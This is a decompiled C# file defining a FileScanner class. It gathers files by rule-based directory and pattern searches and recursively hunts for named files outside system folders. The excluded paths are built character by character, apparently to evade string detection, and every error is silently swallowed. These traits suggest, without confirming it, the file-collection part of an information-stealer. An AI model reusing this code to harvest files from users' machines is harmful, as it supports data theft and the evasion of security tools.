using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000010 RID: 16
public static class FileScanner
{
	// Token: 0x06000049 RID: 73 RVA: 0x00004430 File Offset: 0x00002630
	public static List<ScannedFile> Scan(params FileScannerRule[] scannerRules)
	{
		List<ScannedFile> list = new List<ScannedFile>();
		try
		{
			foreach (FileScannerRule fileScannerRule in scannerRules)
			{
				try
				{
					foreach (FileScannerArg fileScannerArg in fileScannerRule.GetScanArgs())
					{
						try
						{
							foreach (FileInfo fileInfo in new DirectoryInfo(fileScannerArg.Directory).GetFiles(fileScannerArg.Pattern, fileScannerArg.Recoursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly))
							{
								try
								{
									list.Add(new ScannedFile(fileInfo.FullName)
									{
										DirOfFile = fileScannerRule.GetFolder(fileScannerArg, fileInfo),
										NameOfApplication = (string.IsNullOrWhiteSpace(fileScannerRule.Name) ? fileScannerArg.Tag : fileScannerRule.Name)
									});
								}
								catch (Exception)
								{
								}
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600004A RID: 74 RVA: 0x0000456C File Offset: 0x0000276C
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>
		{
			new string(new char[]
			{
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'F',
				'i',
				'l',
				'e',
				's',
				' ',
				'(',
				'x',
				'8',
				'6',
				')',
				'\\'
			}),
			new string(new char[]
			{
				'\\',
				'P',
				'r',
				'o',
				'g',
				'r',
				'a',
				'm',
				' ',
				'D',
				'a',
				't',
				'a',
				'\\'
			})
		};
		List<string> list2 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list2;
		}
		try
		{
			foreach (string text in Directory.GetDirectories(baseDirectory))
			{
				bool flag = false;
				foreach (string value in list)
				{
					if (text.Contains(value))
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag2 = false;
						int num = 0;
						while (num < files2.Length && !flag2)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag2)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag2 = true;
									list2.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in FileScanner.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list2.Contains(item))
							{
								list2.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list2;
	}
}
